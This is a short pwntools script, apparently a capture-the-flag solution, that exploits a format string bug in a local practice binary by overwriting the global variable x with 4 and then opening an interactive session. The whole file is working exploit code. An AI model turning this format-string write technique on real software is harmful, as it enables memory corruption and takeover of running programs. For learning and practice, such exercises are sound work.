from pwn import *
binary_path = './pwn/string/fmt-1/fmt1'

# Load the binary
elf = ELF(binary_path)

# Start the process
p = process(binary_path)

# Find the offset
fmt = FmtStr(execute_fmt=p.sendline)
offset = fmt.offset

# Address of the variable `x`
x_addr = elf.symbols['x']

# Create the payload to overwrite `x` with 4
payload = fmtstr_payload(offset, {x_addr: 4})

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
